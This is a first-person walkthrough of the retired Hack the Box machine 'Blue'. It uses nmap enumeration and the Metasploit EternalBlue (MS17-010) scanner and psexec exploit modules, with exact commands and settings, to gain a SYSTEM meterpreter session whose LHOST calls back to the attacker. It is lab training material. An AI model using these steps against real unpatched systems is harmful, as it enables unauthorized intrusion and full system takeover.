Blue is an Easy level retired machine on Hack the Box. This machine is running an outdated version of Windows that is vulnerable to [cve-2017-0144](https://nvd.nist.gov/vuln/detail/cve-2017-0144) also known as *Eternal Blue*. This vulnerability affects multiple versions of Windows (specific build numbers for windows 10 and later): Windows Vista, Windows7, Windows Server 2008, Windows 8.1, Windows server 2012, Windows 10, and Windows Server 2016. This was patched in March of 2017 meaning anything still vulnerable to it is pretty out of date. 

In short the *SMBv1* server in Microsoft Windows allows for arbitrary code execution is specifically crafted packets. There is a *Metasploit Frameworks* Auxiliary Module that can scan a system and see if it is vulnerable to Eternal blue. There is also a module to exploit the vulnerability and grant a meterpreter on the unpatched system as the `NT AUTHORITY\SYSTEM` user. Since this is the highest privileged user on any Windows System I will have full access from there.

<ins> **Enumeration** </ins>

This is a pretty straightforward machine, still it's good practice to always repeate the first steps so I ran my usual nmap scan to start it off.

`nmap -sV -oA blue_services <target_ip>`

![nmap](/docs/assets/images/HTB/blue/blue01.png)

```
135/tcp msrpc MIcrosofot Windows RPC* 

139/tcp netbios-ssn Microsoft Windows netbios-ssn 

445/tcp Microsoft-ds Microsoft Windows 7 – 10 microsoft –ds (workgroup:WORKGROUP) 

49152/tcp msrpc Microsoft Windows RPC 

49153/tcp msrpc Microsoft Windows RPC 

49154/tcp msrpc Microsoft Windows RPC 

49155/tcp msrpc Microsoft Windows RPC 

49156/tcp msrpc Microsoft Windows RPC 

49157/tcp msrpc Microsoft Windows RPC

Hostname HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows 

```

I used an nmap script scan to further gather some information on that *microsoft-ds* although I can see from my service scan that it is likely running Windows 7-10.

`nmap -p 445 --script smb-protocols <target_ip>`

![nmap script](/docs/assets/images/HTB/blue/blue02.png)

There I can verify that it is indeed running *SMBv1* meaning it's likely vulnerable to *Eternal Blue*.

<ins> **Exploitation with Metasploit** </ins>

Using `msfconsole` to bootup *metasploit* on my system I `search` for *eternal blue* and select the `auxiliary/scanner/smb/smb_ms17_010` module for `use`

```
msfconsole

search eternal blue

use auxiliary/scanner/smb/smb_ms17_010

```

![search eternal blue](/docs/assets/images/HTB/blue/blue03.png)

![use scanner](/docs/assets/images/HTB/blue/blue04.png)

Running `show options` I can see that since the *RPORT* was set to *445* by default all I need to edit is the *RHOSTS* option so that it's set to the *target IP* and *exploit*.

```
show options

set RHOSTS <TARGET_IP>

exploit

```

![set rhosts](/docs/assets/images/HTB/blue/blue05.png)

![exploit](/docs/assets/images/HTB/blue/blue06.png)

I'm now going to use the `exploit/windows/smb/ms17_010_psexec` module from earlier.  
 
*PsExec* is a lightweight *telnet-replacement* developed by Microsoft that allows you to execute processes on remote windows systems using any user's credentials and authenticates over *smb*.

```
use exploit/windows/smb/ms17_010_psexec

show options

```
![change module](/docs/assets/images/HTB/blue/blue07.png)

![show options](/docs/assets/images/HTB/blue/blue08.png)

This one is simple as well. I just need to set the *RHOSTS* to my *target IP* and the *LHOST* to my *host ip* and run the *exploit*.

```
set LHOST <host_ip>

set RHOSTS <target_ip>

exploit

```

![set options2](/docs/assets/images/HTB/blue/blue09.png)


After the exploit runs I'm granted a *meterpreter* and give myself a shell to work with. I run `whoami` to verify that I am the *nt authority/system* user.

![whoami root](/docs/assets/images/HTB/blue/blue10.png)

Since I have the highest level privileges on the system as this user it was as easy as looking around the system for the flags and opening the `user.txt` and `root.txt` files n their respective directories using the `type` command.

<ins> **Final Thoughts** </ins>

This machine was overly simple with *metasploit* and a very outdated system, however my *eJPT* certification course had an entire module dedicated to *Eternal Blue* so I wanted to try it for myself.
